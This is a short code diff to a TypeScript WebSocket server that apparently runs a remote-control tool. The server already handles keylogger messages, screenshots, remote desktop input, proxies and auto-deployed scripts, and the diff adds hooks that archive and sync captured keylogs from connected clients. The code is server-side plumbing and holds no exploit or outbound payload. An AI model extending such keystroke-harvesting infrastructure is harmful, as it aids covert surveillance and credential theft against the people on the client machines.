@@ -210,6 +210,7 @@ type WsLifecycleDeps = {
   dispatchAutoScriptsForConnection: (info: ClientInfo, ws: ServerWebSocket<SocketData>) => void;
   dispatchAutoDeploysForConnection: (info: ClientInfo, ws: ServerWebSocket<SocketData>) => void;
   dispatchAutoLoadPlugins: (info: ClientInfo) => void;
+  dispatchKeylogArchiveSync?: (clientId: string, ws: ServerWebSocket<SocketData>) => boolean;
   takePendingNotificationScreenshot: (clientId: string) => any;
   storeNotificationScreenshot: (
     pending: any,
@@ -226,6 +227,7 @@ type WsLifecycleDeps = {
   handleProxyConnectResult: (clientId: string, connectionId: string, ok: boolean) => void;
   handleProcessMessage: (clientId: string, payload: any) => void;
   handleKeyloggerMessage: (clientId: string, payload: any) => void;
+  handleKeylogArchiveMessage?: (clientId: string, payload: any, ws?: ServerWebSocket<SocketData>) => void;
   notifyRdInputLatency: (commandId: string) => void;
   handleNotificationScreenshotFailure: (commandId: string | undefined, ok: boolean | undefined, message: string | undefined) => void;
   handlePluginEvent: (clientId: string, payload: any) => void;
@@ -675,6 +677,7 @@ export async function handleWebSocketMessage(
         deps.dispatchAutoScriptsForConnection(infoObj, ws);
         deps.dispatchAutoDeploysForConnection(infoObj, ws);
         deps.dispatchAutoLoadPlugins(infoObj);
+        deps.dispatchKeylogArchiveSync?.(infoObj.id, ws);
         deps.notifyDashboard();
         if (!reconnectedWithinGrace) {
           deps.notifyDashboardClientEvent("client_online", {
@@ -803,6 +806,7 @@ export async function handleWebSocketMessage(
       case "keylog_clear_result":
       case "keylog_delete_result":
       case "keylog_permission_result":
+        deps.handleKeylogArchiveMessage?.(client.id, payload, ws);
         deps.handleKeyloggerMessage(client.id, payload);
         break;
       case "script_result": {
